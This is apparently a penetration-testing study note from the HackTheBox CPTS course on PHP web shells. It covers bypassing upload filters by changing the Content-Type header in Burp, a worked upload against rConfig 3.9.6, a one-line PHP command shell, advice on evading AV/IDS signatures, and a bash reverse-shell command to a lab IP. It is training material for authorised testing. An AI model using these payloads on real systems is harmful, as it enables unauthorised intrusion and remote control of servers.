---
title: "PHP Web Shells"
kind: topic
tags:
  - cpts-hackthebox
area: "CPTS HackTheBox"
up: "[[Shells and Payloads]]"
notion-id: 39e759b9275180ec9ffcff8892633072
---

# PHP Web Shells

In: [[Career]] / [[CPTS HackTheBox]] / [[Shells and Payloads]]

## Key Context

PHP powers **78.6% of all websites** with known server-side languages → most common web shell target. If you see `.php` files or a PHP-based app → PHP web shell is a viable path.

---

## Methodology

```
Identify PHP app → Find file upload → Attempt upload → Bypass file type check (Burp) → Navigate to shell → Execute commands → Upgrade to reverse shell → Delete payload
```

---

## File Type Bypass with Burp Suite

### The Problem

Web apps often restrict uploads to image types (`.png`, `.jpg`, `.gif`) — will reject `.php` directly.

### The Fix: Change Content-Type Header in Burp

```
1. Start Burp Suite
2. Set browser proxy: 127.0.0.1:8080
3. Upload .php file through the web form
4. Intercept the POST request in Burp
5. Find: Content-Type: application/x-php
6. Change to: Content-Type: image/gif
7. Forward the request
```

> [!note]
> The server checks the **Content-Type header**, not the actual file content → easily spoofed
>

---

## Example: rConfig File Upload

```
Target: rConfig 3.9.6 (PHP-based)
Path: Devices → Vendors → Add Vendor → Logo upload field

Upload: connect.php (WhiteWinterWolf's PHP web shell)
Content-Type changed to: image/gif

Navigate to: http://TARGET/images/vendor/connect.php
→ Non-interactive shell session in browser
```

---

## PHP Web Shell Options

| Shell | Source | Notes |
| --- | --- | --- |
| WhiteWinterWolf | GitHub | Feature-rich, browser-based |
| Laudanum PHP | `/usr/share/laudanum/php/` | Pre-built, needs IP editing |
| Simple one-liner | `<?php system($_GET['cmd']); ?>` | Minimal, low signature |

**Minimal PHP shell (for custom use):**

```php
<?php system($_GET['cmd']); ?>
# Usage: http://target/shell.php?cmd=whoami
```

---

## Operational Security Considerations

| Issue | Impact |
| --- | --- |
| App auto-deletes uploaded files | Shell disappears after time limit |
| No command chaining (`&&`) | Enumeration is slower |
| Non-interactive shell | Can't use `su`, `sudo` easily |
| File left behind | Evidence of compromise after engagement |
| Comments in payload | AV/IDS signature detection |

**Best practices:**

- **Remove comments** from all web shell files before uploading
- **Establish reverse shell ASAP** → then delete the web shell
- **Document everything**: file names, upload paths, hashes (SHA1/MD5), timestamps
- Use `sha1sum` or `md5sum` on payload files for report evidence/attribution

---

## After Getting the Web Shell

```bash
# Upgrade to reverse shell from PHP web shell
# (execute via the web shell's command input)
bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'

# Or use Python pty spawn if you land a basic shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Assessment

![[attachments/CPTS HackTheBox/Shells and Payloads/PHP Web Shells/image.png]]

![[attachments/CPTS HackTheBox/Shells and Payloads/PHP Web Shells/image 1.png]]
